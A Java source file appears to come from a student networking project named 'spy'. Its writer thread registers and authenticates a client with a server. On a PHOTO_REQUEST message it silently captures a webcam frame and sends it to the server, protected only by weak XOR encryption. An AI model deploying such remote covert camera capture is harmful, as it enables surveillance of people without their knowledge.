package pl.edu.pw.elka.tin.spy.client.application;

import lombok.AllArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.bytedeco.javacv.*;
import pl.edu.pw.elka.tin.spy.client.domain.protocol.RawMessageParser;
import pl.edu.pw.elka.tin.spy.client.domain.protocol.message.*;
import pl.edu.pw.elka.tin.spy.client.encryption.XOREncryptor;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.LinkedList;
import java.util.List;
import java.util.Queue;
import java.util.concurrent.ConcurrentLinkedQueue;

import static pl.edu.pw.elka.tin.spy.client.application.PropertiesUtils.*;

@Slf4j
@AllArgsConstructor
public class WriterThread implements Runnable {
	private final ConcurrentLinkedQueue<byte[]> rawMessageQueue;
	private Socket socket;
	private DataOutputStream outputStream;
	private Queue<Message> outputMessageQueue;

	private XOREncryptor encryptor;
	private byte[] secret;

	private boolean registered = false;
	private boolean authSend = false;
	private boolean regSend = false;
	private boolean authenticated = false;

	private String login;
	private String password;

	public WriterThread(Socket outSocket, ConcurrentLinkedQueue<byte[]> outQueue) {
		this.socket = outSocket;
		this.rawMessageQueue = outQueue;
		this.outputMessageQueue = new LinkedList<>();
		this.secret = null;
		this.encryptor = new XOREncryptor();

		try {
			this.outputStream = new DataOutputStream(socket.getOutputStream());
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	@Override
	public void run() {
		log.info("Starting Writer Thread");

		createPropertiesFile();
		registered = isRegistered();
		login = getProperty("login");
		password = getProperty("password");

		while (true) {
			if (rawMessageQueue.size() > 0) {
				List<byte[]> rawMessages = new LinkedList<>();
				while (rawMessageQueue.size() > 0) {
					rawMessages.add(rawMessageQueue.poll());
				}

				rawMessages.stream()
						.map(RawMessageParser::parse)
						.forEach(outputMessageQueue::add);
			}

			if (!registered && !regSend)
				outputMessageQueue.add(new RegistrationRequestMessage(login, password));
			if (registered && !authenticated && !authSend)
				outputMessageQueue.add(new AuthRequestMessage(clientId(), password));

			Message newMessage = outputMessageQueue.poll();

			if (newMessage != null) {
				handleMessage(newMessage);
			}
		}
	}

	private void handleMessage(Message message) {
		switch (message.header()) {
			case PHOTO_REQUEST: {
				log.info("Get PHOTO message, sending photo to server");
				byte[] photo = takePhoto();
				sendMessage(new PhotoMessage(photo));
				break;
			}
			case UNAUTHORIZED_REQUEST: {
				log.info("Get UNAUTHORIZED_REQUEST message");
				break;
			}
			case REGISTRATION_REQUEST: {
				sendMessage((SendMessage) message);
				regSend = true;
				break;
			}
			case SUCCESSFUL_REGISTRATION: {
				log.info("Get REGISTRATION_SUCCESSFUL message, saving registration info");
				SuccessfulRegistrationMessage successMessage = (SuccessfulRegistrationMessage) message;
				int clientId = successMessage.getClientID();
				saveRegisteredInfo(clientId, "true");
				registered = true;
				break;
			}
			case REGISTRATION_FAILED: {
				log.info("Get REGISTRATION_FAILED message, saving registration info");
				saveRegisteredInfo(-1, "false");
				break;
			}
			case AUTHENTICATION_REQUEST: {
				sendMessage((SendMessage) message);
				authSend = true;
				break;
			}
			case SUCCESSFUL_AUTH: {
				log.info("Get SUCCESSFUL_AUTH message");
				SuccessfulAuthMessage successMessage = (SuccessfulAuthMessage) message;
				secret = successMessage.getSecret();
				authenticated = true;
				break;
			}
			case AUTH_FAILED: {
				log.info("Get AUTH_FAILED message");
				authenticated = false;
				break;
			}
		}
	}

	private void sendMessage(SendMessage message) {
		try {
			outputStream.write(encryptor.encrypt(message.toByteArray(), secret));
		} catch (IOException e) {
			e.printStackTrace();
			log.error("Failed to send message");
		}
	}

	private byte[] takePhoto() {
		OpenCVFrameGrabber grabber = new OpenCVFrameGrabber(0);

		byte[] image = null;
		try {
			grabber.start();
			Frame frame = grabber.grab();

			BufferedImage img = new Java2DFrameConverter().convert(frame);
			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			ImageIO.write(img, "jpg", baos);
			image = baos.toByteArray();
			baos.flush();
			baos.close();
		} catch (FrameGrabber.Exception | IOException e) {
			log.error("Couldn't grab a photo");
		} finally {
			try {
				grabber.stop();
			} catch (FrameGrabber.Exception e) {
				e.printStackTrace();
			}
		}

		return image;
	}
}
